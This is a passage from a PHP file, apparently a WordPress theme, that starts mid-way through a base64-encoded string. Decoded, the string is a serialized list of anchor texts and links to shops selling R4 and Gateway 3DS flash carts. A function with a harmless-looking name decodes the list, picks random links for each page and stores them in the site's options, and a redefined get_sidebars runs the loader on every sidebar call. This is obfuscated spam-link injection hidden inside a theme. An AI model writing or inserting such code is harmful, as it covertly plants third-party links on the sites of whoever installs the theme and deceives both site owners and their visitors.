M2RzLXhsLXY0MS00NS1wLTIzLmh0bWwiO3M6Mjc6IlI0aSBnb2xkIDNkcyBkZWx1eGUgZWRpdGlvbiI7czo4MDoiaHR0cDovL3d3dy5yNDNkc2thcnRlZGUuY29tL3I0aS1nb2xkLTNkcy1kZWx1eGUtZWRpdGlvbi0zZHMtZmxhc2hrYXJ0ZS1wLTIwLmh0bWwiO3M6MzE6Ik5pbnRlbmRvIERTaS9EU2kgWEwgRmxhc2hjYXJ0ZW4iO3M6NjQ6Imh0dHA6Ly93d3cucjQzZHNnZXJtYW55LmNvbS9uaW50ZW5kby1kc2lkc2kteGwtZmxhc2hjYXJ0ZW4tYy0xOC8iO3M6NjoiUjQgZHNpIjtzOjQ0OiJodHRwOi8vd3d3LnI0M2RzZ2VybWFueS5jb20vcjRpLXNkaGMtYy0xOF81LyI7czo4OiJSNGkgc2RoYyI7czo0NDoiaHR0cDovL3d3dy5yNDNkc2dlcm1hbnkuY29tL3I0aS1zZGhjLWMtMThfNS8iO3M6OToiUjRpIGthcnRlIjtzOjQ0OiJodHRwOi8vd3d3LnI0M2RzZ2VybWFueS5jb20vcjRpLXNkaGMtYy0xOF81LyI7czoxMDoiQWNla2FyZCAyaSI7czo0NzoiaHR0cDovL3d3dy5yNDNkc2dlcm1hbnkuY29tL2FjZWthcmQtMmktYy0xOF8xOS8iO3M6ODoiTTNpIHplcm8iO3M6NDU6Imh0dHA6Ly93d3cucjQzZHNnZXJtYW55LmNvbS9tM2ktemVyby1jLTE4XzIwLyI7czoyMDoid3d3LnI0M2RzZ2VybWFueS5jb20iO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNnZXJtYW55LmNvbSI7czoyNzoiaHR0cDovL3d3dy5yNDNkc2dlcm1hbnkuY29tIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzZ2VybWFueS5jb20iO3M6MTY6IlI0M2Rza2FydGVkZS5jb20iO3M6Mzk6Imh0dHA6Ly93d3cucjQzZHNrYXJ0ZWRlLmNvbS9yNC0zZHMtYy02LyI7czoyNzoiaHR0cDovL3d3dy5yNDNkc2thcnRlZGUuY29tIjtzOjM5OiJodHRwOi8vd3d3LnI0M2Rza2FydGVkZS5jb20vcjQtM2RzLWMtNi8iO3M6MjA6Ind3dy5yNDNkc2thcnRlZGUuY29tIjtzOjI3OiJodHRwOi8vd3d3LnI0M2Rza2FydGVkZS5jb20iO3M6MTI6InI0aSBzZGhjIDNkcyI7czo4NToiaHR0cDovL3d3dy5yNDNkc2thcnRlZGUuY29tL3I0LTNkcy1rYXJ0ZS1mJUMzJUJDci0zZHMtM2RzLXhsLWRzaS1kc2kteGwtMmRzLXAtMTMuaHRtbCI7czoxMjoiUjRpIGdvbGQgM2RzIjtzOjkxOiJodHRwOi8vd3d3LnI0M2Rza2FydGVkZS5jb20vcjRpLWdvbGQtM2RzLWthcnRlLWYlQzMlQkNyLTNkcy0zZHMteGwtMmRzLWRzaS1kc2kteGwtcC0xNC5odG1sIjtzOjE4OiJSNGkgc2RoYyBkdWFsIGNvcmUiO3M6ODU6Imh0dHA6Ly93d3cucjQzZHNrYXJ0ZWRlLmNvbS9yNGlzZGhjLWR1YWxjb3JlLWYlQzMlQkNyLTNkcy0zZHMteGwtZHNpLXhsLTJkcy1wLTE2Lmh0bWwiO3M6MTY6IlI0c2RoYyBkdWFsIGNvcmUiO3M6ODU6Imh0dHA6Ly93d3cucjQzZHNrYXJ0ZWRlLmNvbS9yNGlzZGhjLWR1YWxjb3JlLWYlQzMlQkNyLTNkcy0zZHMteGwtZHNpLXhsLTJkcy1wLTE2Lmh0bWwiO3M6MTE6IkdhdGV3YXkgM0RTIjtzOjkzOiJodHRwOi8vd3d3LnI0M2Rza2FydGVkZS5jb20vZ2F0ZXdheS0zZHMtcm9tcy1mbGFzaGthcnRlLWYlQzMlQkNyLTNkc3hsLXY0MTAtdG8tdjQ1MC1wLTIxLmh0bWwiO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNrYXJ0ZS5kZSI7czoyNDoiaHR0cDovL3d3dy5yNDNkc2thcnRlLmRlIjtzOjEzOiJyNDNkc2thcnRlLmRlIjtzOjI0OiJodHRwOi8vd3d3LnI0M2Rza2FydGUuZGUiO3M6MTc6Ind3dy5yNDNkc2thcnRlLmRlIjtzOjI0OiJodHRwOi8vd3d3LnI0M2Rza2FydGUuZGUiO3M6NDoiU2l0ZSI7czoyNzoiaHR0cDovL3d3dy5yNDNkc2thcnRlZGUuY29tIjtzOjQ6IkhlcmUiO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNrYXJ0ZWRlLmNvbSI7czoxMjoiZ3V0ZSBXZWJzaXRlIjtzOjI3OiJodHRwOi8vd3d3LnI0M2Rza2FydGVkZS5jb20iO3M6MjE6Ik9mZml6aWVsbGUgVmVya8OkdWZlciI7czoyNDoiaHR0cDovL3d3dy5yNDNkc2thcnRlLmRlIjtzOjQ6IkhpZXIiO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNrYXJ0ZS5kZSI7czo5OiJHZXNjaMOkZnQiO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNrYXJ0ZS5kZSI7czoxNjoia2xpY2tlbiBTaWUgaGllciI7czoyNDoiaHR0cDovL3d3dy5yNDNkc2thcnRlLmRlIjt9aTozO2E6NDc6e3M6MjY6Imh0dHA6Ly93d3cucjRyNGljYXJkdWsuY29tIjtzOjI2OiJodHRwOi8vd3d3LnI0cjRpY2FyZHVrLmNvbSI7czoxNToiUjRyNGljYXJkdWsuY29tIjtzOjI2OiJodHRwOi8vd3d3LnI0cjRpY2FyZHVrLmNvbSI7czoxOToid3d3LlI0cjRpY2FyZHVrLmNvbSI7czoyNjoiaHR0cDovL3d3dy5yNHI0aWNhcmR1ay5jb20iO3M6MTE6IlI0IDNkcyBjYXJkIjtzOjI2OiJodHRwOi8vd3d3LnI0cjRpY2FyZHVrLmNvbSI7czoxMjoiUjRpIDNkcyBjYXJkIjtzOjI2OiJodHRwOi8vd3d3LnI0cjRpY2FyZHVrLmNvbSI7czo4OiJSNGkgY2FyZCI7czoyNjoiaHR0cDovL3d3dy5yNHI0aWNhcmR1ay5jb20iO3M6NzoiUjQgY2FyZCI7czoyNjoiaHR0cDovL3d3dy5yNHI0aWNhcmR1ay5jb20iO3M6NDoiSGVyZSI7czoyNjoiaHR0cDovL3d3dy5yNHI0aWNhcmR1ay5jb20iO3M6OToiR29vZCBzaXRlIjtzOjI2OiJodHRwOi8vd3d3LnI0cjRpY2FyZHVrLmNvbSI7czo4OiJPdXIgc2l0ZSI7czoyNjoiaHR0cDovL3d3dy5yNHI0aWNhcmR1ay5jb20iO3M6NDoiU2l0ZSI7czoyNjoiaHR0cDovL3d3dy5yNHI0aWNhcmR1ay5jb20iO3M6MzoiVXJsIjtzOjI2OiJodHRwOi8vd3d3LnI0cjRpY2FyZHVrLmNvbSI7czoxMToiR29vZCBzZWxsZXIiO3M6MjY6Imh0dHA6Ly93d3cucjRyNGljYXJkdWsuY29tIjtzOjE2OiJOaWNlIG9ubGluZSBzaG9wIjtzOjI2OiJodHRwOi8vd3d3LnI0cjRpY2FyZHVrLmNvbSI7czo3OiJBZGRyZXNzIjtzOjI2OiJodHRwOi8vd3d3LnI0cjRpY2FyZHVrLmNvbSI7czoxMToiT3VyIGFkZHJlc3MiO3M6MjY6Imh0dHA6Ly93d3cucjRyNGljYXJkdWsuY29tIjtzOjEwOiJDbGljayBoZXJlIjtzOjI2OiJodHRwOi8vd3d3LnI0cjRpY2FyZHVrLmNvbSI7czoxOToid3d3LnI0cjRpY2FyZHVrLmNvbSI7czoyNjoiaHR0cDovL3d3dy5yNHI0aWNhcmR1ay5jb20iO3M6MjQ6IjNEUyBMTOODnuOCuOOCs+ODs+iyqeWjsiI7czoyNzoiaHR0cDovL3d3dy5nYXRld2F5M2RzanAuY29tIjtzOjI3OiIzRFPlr77lv5zjg57jgrjjgrPjg7PpgJrosqkiO3M6Mjc6Imh0dHA6Ly93d3cuZ2F0ZXdheTNkc2pwLmNvbSI7czozMDoiM0RTTEwg5a++5b+c44Oe44K444Kz44Oz6YCa6LKpIjtzOjI3OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20iO3M6Mjc6IkRTSeWvvuW/nOODnuOCuOOCs+ODs+mAmuiyqSI7czoyNzoiaHR0cDovL3d3dy5nYXRld2F5M2RzanAuY29tIjtzOjI5OiJORFNpIOWvvuW/nOODnuOCuOOCs+ODs+mAmuiyqSI7czoyNzoiaHR0cDovL3d3dy5nYXRld2F5M2RzanAuY29tIjtzOjEyOiLjg57jgrjjgrPjg7MiO3M6Mjc6Imh0dHA6Ly93d3cuZ2F0ZXdheTNkc2pwLmNvbSI7czoxNToiM0RT44Oe44K444Kz44OzIjtzOjI3OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20iO3M6OToiM2Rz5a++5b+cIjtzOjI3OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20iO3M6MTI6IjNkcyBMTOWvvuW/nCI7czoyNzoiaHR0cDovL3d3dy5nYXRld2F5M2RzanAuY29tIjtzOjEwOiJEU2kg5a++5b+cIjtzOjI3OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20iO3M6NjoiRFNpIExMIjtzOjY6IuWvvuW/nCI7czoyMToi6LaF5r+A5a6J44Oe44K444Kz44OzIjtzOjI3OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20iO3M6NDI6Iui2heWuieODnuOCuOOCs+ODs+ato+imj+WTgemAmuiyqeOBqOiyqeWjsiI7czoyNzoiaHR0cDovL3d3dy5nYXRld2F5M2RzanAuY29tIjtzOjMxOiLmoLzlrokzRFMg44Oe44K444Kz44Oz5bCC6ZaA5bqXIjtzOjI3OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20iO3M6NjoiUjQgM0RTIjtzOjI3OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20iO3M6NzoiUjRpIDNEUyI7czoyNzoiaHR0cDovL3d3dy5nYXRld2F5M2RzanAuY29tIjtzOjEyOiJSNGkgU0RIQyAzRFMiO3M6Mjc6Imh0dHA6Ly93d3cuZ2F0ZXdheTNkc2pwLmNvbSI7czo0OiJSNERTIjtzOjI3OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20iO3M6NjoiUjQgRFNJIjtzOjI3OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20iO3M6MTE6IkdBVEVXQVkgM0RTIjtzOjI3OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20iO3M6MjQ6IkdBVEVXQVkgM0RTIOODnuOCuOOCs+ODsyI7czoyNzoiaHR0cDovL3d3dy5nYXRld2F5M2RzanAuY29tIjtzOjM2OiJHQVRFV0FZIDNEUyDmraPopo/lk4HpgJrosqnjgajosqnlo7IiO3M6Mjc6Imh0dHA6Ly93d3cuZ2F0ZXdheTNkc2pwLmNvbSI7czoxNzoiR0FURVdBWSAzRFPos7zlhaUiO3M6Mjc6Imh0dHA6Ly93d3cuZ2F0ZXdheTNkc2pwLmNvbSI7czoyMToi6LaF5r+A5a6JIEdBVEVXQVkgM0RTIjtzOjI3OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20iO3M6Mjk6IuagvOWuiTNEUyBHQVRFV0FZ44Oe44K444Kz44OzIjtzOjI3OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20iO3M6MTI6IlI0SSBTREhDIDNEUyI7czo0OToiaHR0cDovL3d3dy5nYXRld2F5M2RzanAuY29tL3I0aS1zZGhjLTNkcy1jLTEuaHRtbCI7czoxMjoiUjRJIEdPTEQgM0RTIjtzOjQ5OiJodHRwOi8vd3d3LmdhdGV3YXkzZHNqcC5jb20vcjRpLWdvbGQtM2RzLWMtMy5odG1sIjtzOjE1OiJTdXBlcmNhcmQgZHN0d28iO3M6NTI6Imh0dHA6Ly93d3cuZ2F0ZXdheTNkc2pwLmNvbS9zdXBlcmNhcmQtZHN0d28tYy02Lmh0bWwiO3M6MTg6IlI0aSBzZGhjIGR1YWwgY29yZSI7czo1NToiaHR0cDovL3d3dy5nYXRld2F5M2RzanAuY29tL3I0aS1zZGhjLWR1YWwtY29yZS1jLTcuaHRtbCI7fX0="; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_initialize_the_theme_load(); get_sidebar($the_sidebar); } }
?>